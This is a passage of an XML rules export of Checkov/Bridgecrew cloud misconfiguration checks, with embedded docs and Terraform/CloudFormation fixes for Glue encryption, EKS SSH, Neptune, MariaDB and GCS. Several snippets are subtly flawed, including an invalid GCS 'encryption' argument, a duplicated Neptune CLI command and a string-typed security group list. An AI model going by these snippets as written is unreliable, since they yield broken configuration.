<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_sagemaker_endpoint_configuration.examplea.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_sagemaker_endpoint_configuration.examplea.tf">resource "aws_sagemaker_endpoint_configuration" "example" {
  ...
  name        = "my-endpoint-config"
+ kms_key_arn = aws_kms_key.examplea.arn
  production_variants {
    variant_name           = "variant-1"
    model_name             = aws_sagemaker_model.examplea.name
    initial_instance_count = 1
    instance_type          = "ml.t2.medium"
  }
  ...
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_general_40' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_general_40</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_general_40' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_99</key>
    <name>Ensure AWS Glue security configuration encryption is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-glue-security-configuration-encryption-is-not-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-glue-security-configuration-encryption-is-not-enabled"></div>AWS Glue security configuration encryption is not enabled</div><a aria-label="Skip link to AWS Glue security configuration encryption is not enabled" class="heading-anchor-icon fa fa-anchor" href="#aws-glue-security-configuration-encryption-is-not-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Ensure that AWS Glue has encryption enabled. AWS glue has three possible components that could be encrypted: Cloudwatch, job bookmarks and S3 buckets. This check ensures that each is set correctly.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource: </strong> aws_glue_security_configuration</li>
<li><strong>Arguments:</strong> encryption_configuration, job_bookmarks_encryption, s3_encryption</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_glue_security_configuration.test.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_glue_security_configuration.test.tf">resource "aws_glue_security_configuration" "test" {
  name = "example"
    ...
+ encryption_configuration {
+   cloudwatch_encryption {
+     cloudwatch_encryption_mode = "SSE-KMS"
+     kms_key_arn        = aws_kms_key.example.arn
+   }

+   job_bookmarks_encryption {
+     job_bookmarks_encryption_mode = "CSE-KMS"
+     kms_key_arn        = aws_kms_key.example.arn
+   }

+   s3_encryption {
+     kms_key_arn        = aws_kms_key.example.arn
+     s3_encryption_mode = "SSE-KMS"
+   }
+ }
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource: </strong> AWS::Glue::SecurityConfiguration</li>
<li><strong>Arguments:</strong> Properties.EncryptionConfiguration</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
  Resource0:
    Type: AWS::Glue::SecurityConfiguration
    Properties:
      ...
      EncryptionConfiguration:
        CloudWatchEncryption: 
+         CloudWatchEncryptionMode: SSE-KMS #any value but 'DISABLED'
          ...
        JobBookmarksEncryption: 
+         JobBookmarksEncryptionMode: CSE-KMS #any value but 'DISABLED'
          ...
        S3Encryptions: 
+         S3EncryptionMode: SSE-KMS #any value but 'DISABLED'
          ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_general_41' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_general_41</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_general_41' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_100</key>
    <name>Ensure AWS EKS node group does not have implicit SSH access from 0.0.0.0/0</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="ensure-aws-eks-node-group-does-not-have-implicit-ssh-access-from-00000"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-ensure-aws-eks-node-group-does-not-have-implicit-ssh-access-from-0-0-0-0-0"></div>Ensure AWS EKS node group does not have implicit SSH access from 0.0.0.0/0</div><a aria-label="Skip link to Ensure AWS EKS node group does not have implicit SSH access from 0.0.0.0/0" class="heading-anchor-icon fa fa-anchor" href="#ensure-aws-eks-node-group-does-not-have-implicit-ssh-access-from-00000"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Make sure your EKS node group does not allow full access to SSH.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_eks_node_group</li>
<li><strong>Argument</strong>: remote_access/source_security_group_ids<br/>
Makes sure there is no remote access block or the addition of source_security_group_ids</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_eks_node_group.test.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_eks_node_group.test.tf">resource "aws_eks_node_group" "test" {
  ...
  cluster_name    = aws_eks_cluster.example.name
  remote_access {
    ec2_ssh_key = "some-key"
+    source_security_group_ids = "some-group"
  }
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource</strong>: AWS::EKS::Nodegroup</li>
<li><strong>Argument</strong>: Properties.RemoteAccess</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
  Nodegroup1:
    Type: 'AWS::EKS::Nodegroup'
    Properties:
      ...
      RemoteAccess: 
        Ec2SshKey: &lt;ssh key&gt;
+       SourceSecurityGroups: 
+         - ...

  Nodegroup2:
    Type: 'AWS::EKS::Nodegroup'
    Properties:
      ...
-     RemoteAccess:
-               ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_kubernetes_5' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_kubernetes_5</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_kubernetes_5' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_101</key>
    <name>Ensure Neptune logging is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="neptune-logging-is-not-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-neptune-logging-is-not-enabled"></div>Neptune logging is not enabled</div><a aria-label="Skip link to Neptune logging is not enabled" class="heading-anchor-icon fa fa-anchor" href="#neptune-logging-is-not-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p> These logs can be used to analyse traffic patterns and troubleshoot security and operational issues.<br/>
It is recommended that you set your cluster to optionally export its' logs to AWS Cloudwatch.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_neptune_cluster</li>
<li><strong>Argument:</strong> enable_cloudwatch_logs_exports</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_neptune_cluster" "Pike" {
  cluster_identifier   = var.DBClusterIdentifier
 
    ...
+ enable_cloudwatch_logs_exports      = ["audit"]
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource:</strong> AWS::Neptune::DBCluster</li>
<li><strong>Argument:</strong> Properties.EnableCloudWatchLogExports</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Type: "AWS::Neptune::DBCluster"
    Properties:
        ...
+       EnableCloudwatchLogsExports: ["audit"]
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_logging_24' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_logging_24</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_logging_24' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_102</key>
    <name>Ensure Neptune cluster instance is not publicly available</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="neptune-cluster-instance-is-publicly-available"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-neptune-cluster-instance-is-publicly-available"></div>Neptune cluster instance is publicly available</div><a aria-label="Skip link to Neptune cluster instance is publicly available" class="heading-anchor-icon fa fa-anchor" href="#neptune-cluster-instance-is-publicly-available"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Amazon Neptune is a graph database service that for high-performance graph database engine. Neptune supports the popular graph query languages Apache TinkerPop Gremlin and W3C&#8217;s SPARQL. </p>
<p>Neptune also gives you the ability to create snapshots of your databases, which you can use later to restore a database. You can share a snapshot with a different Amazon Web Services account, and the owner of the recipient account can use your snapshot to restore a DB that contains your data. You can even choose to make your snapshots public &#8211; that is, anybody can restore a DB containing your data.</p>
<p>This is a check to make sure that your database resource is not Publicly available. This is the resources' default behaviour. <a href="https://docs.aws.amazon.com/neptune/latest/userguide/security-vpc.html" target="_self">https://docs.aws.amazon.com/neptune/latest/userguide/security-vpc.html</a>. . </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>First find your neptune instance id with the AWS commandline:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">aws neptune describe-db-instances
</code></pre>
<p>Once you have your instance id you can unset its public status with:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">aws neptune modify-db-instance aws neptune --db-instance-identifier &lt;your db identifier&gt; --no-publicly-accessible
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource: </strong> aws_neptune_cluster_instance</li>
<li><strong>Argument:</strong>  publicly_accessible this default to false, so the check is to ensure it's missing or false.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_neptune_cluster_instance.example.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_neptune_cluster_instance.example.tf">resource "aws_neptune_cluster_instance" "example" {
  count              = 2
  cluster_identifier = aws_neptune_cluster.default.id
  engine             = "neptune"
  instance_class     = "db.r4.large"
  apply_immediately  = true
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_general_42' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_general_42</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_general_42' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_47</key>
    <name>Ensure MariaDB servers have Enforce SSL connection enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-mariadb-database-server-with-ssl-connection-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-maria-db-database-server-with-ssl-connection-disabled"></div>Azure MariaDB database server with SSL connection disabled</div><a aria-label="Skip link to Azure MariaDB database server with SSL connection disabled" class="heading-anchor-icon fa fa-anchor" href="#azure-mariadb-database-server-with-ssl-connection-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Azure Database for MariaDB supports connecting your Azure Database for MariaDB server to client applications using Secure Sockets Layer (SSL). Enforcing SSL connections between your database server and your client applications helps protect against 'man in the middle' attacks by encrypting the data stream between the server and your application. This configuration enforces that SSL is always enabled for accessing your database server.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resources</strong>: azurerm_mariadb_server </li>
<li><strong>Argument</strong>: ssl_enforcement_enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_mariadb_server" "example" {
  ...
+  ssl_enforcement_enabled = true
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_azr_networking_17' target='_blank'> https://docs.bridgecrew.io/docs/bc_azr_networking_17</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_azr_networking_17' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_5</key>
    <name>Ensure Google storage buckets are encrypted</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="google-storage-buckets-are-not-encrypted"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-google-storage-buckets-are-not-encrypted"></div>Google storage buckets are not encrypted</div><a aria-label="Skip link to Google storage buckets are not encrypted" class="heading-anchor-icon fa fa-anchor" href="#google-storage-buckets-are-not-encrypted"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Google Storage Buckets is a Google service to store unstructured data that can be accessed by a key. By default, Google will encrypt and decrypt the data to and from disk using a managed encryption key.</p>
<p>Google cloud storage services encrypts data on the server side, before it is written to disk, at no additional charge. </p>
<p>We recommend you use opt-in server-side-encryption wherever available. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<p>Use customer-managed encryption keys to configure your Cloud Storage service account with permission to use your Cloud KMS key, using the GCP Console, follow these steps:</p>
<ol>
<li>Log in to the GCP Console at <a href="https://console.cloud.google.com" target="_self">https://console.cloud.google.com</a>.</li>
<li>Navigate to <strong>Cloud Key Management Service Keys</strong>.</li>
<li>Click on the name of the key ring that contains the desired key.</li>
<li>Select the key's checkbox. The <strong>Permissions</strong> tab in the right window pane becomes available.</li>
<li>In the <strong>Add members</strong> dialog, enter the email address of the Cloud Storage service account you are granting access to.</li>
<li>In the <strong>Select a role</strong> drop down, select <strong>Cloud KMS CryptoKey Encrypter/Decrypter</strong>.</li>
<li>Click <strong>Add</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>Use the gsutil kms authorize command to give the service account associated with your bucket permission to encrypt and decrypt objects using your Cloud KMS key:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gsutil kms authorize 
-p PROJECT_STORING_OBJECTS 
-k KEY_RESOURCE
</code></pre>
<p>PROJECT_STORING_OBJECTS is the ID for the project containing the objects you want to encrypt or decrypt. For example, my-pet-project.<br/>
KEY_RESOURCE is your Cloud KMS key resource. For example, projects/my-pet-project/locations/us-east1/keyRings/my-key-ring/cryptoKeys/my-key.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: google_storage_bucket</li>
<li><strong>Argument</strong>: encryption (Optional)<br/>
The bucket's encryption configuration.<br/>
default_kms_key_name: A Cloud KMS key that will be used to encrypt objects inserted into this bucket, if no encryption method is specified. You must pay attention to whether the crypto key is available in the location that this bucket is created in.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_storage_bucket" "auto-expire" {
  name          = "auto-expiring-bucket"
  location      = "US"
  force_destroy = true
+ encryption = default_kms_key_name
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_gcs_1' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_gcs_1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_gcs_1' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_48</key>
    <name>Ensure MariaDB servers have public network access enabled set to False</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="mariadb-servers-do-not-have-public-network-access-enabled-set-to-false"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-maria-db-servers-do-not-have-public-network-access-enabled-set-to-false"></div>MariaDB servers do not have public network access enabled set to False</div><a aria-label="Skip link to MariaDB servers do not have public network access enabled set to False" class="heading-anchor-icon fa fa-anchor" href="#mariadb-servers-do-not-have-public-network-access-enabled-set-to-false"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Ensure that this DB is no Public on the Internet.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resources</strong>: azurerm_mariadb_server </li>
<li><strong>Argument</strong>: public_network_access_enabled is set to False.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_mariadb_server" "example" {
   ...
+  public_network_access_enabled = false

}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_azr_public_1' target='_blank'> https://docs.bridgecrew.io/docs/bc_azr_public_1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_azr_public_1' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_49</key>
    <name>Ensure Azure Linux scale set uses an SSH key</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-linux-scale-set-does-not-use-an-ssh-key"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-linux-scale-set-does-not-use-an-ssh-key"></div>Azure Linux scale set does not use an SSH key</div><a aria-label="Skip link to Azure Linux scale set does not use an SSH key" class="heading-anchor-icon fa fa-anchor" href="#azure-linux-scale-set-does-not-use-an-ssh-key"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The default option for a Linux scale set uses basic authentication as an access credential for the secure shell network protocol.<br/>
Using SSH keys instead of common credentials (i.e. username and password) represents the best way to secure your Linux scale sets against malicious activities such as brute-force attacks, by providing a level of authorization that can only be fulfilled by privileged users who have ownership to the private key associated with the public key created on these sets. An attacker may be able to get access to the linux scale set&#8217;s public key, but without the associated private key, he/she will be unable to gain shell access to the server.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
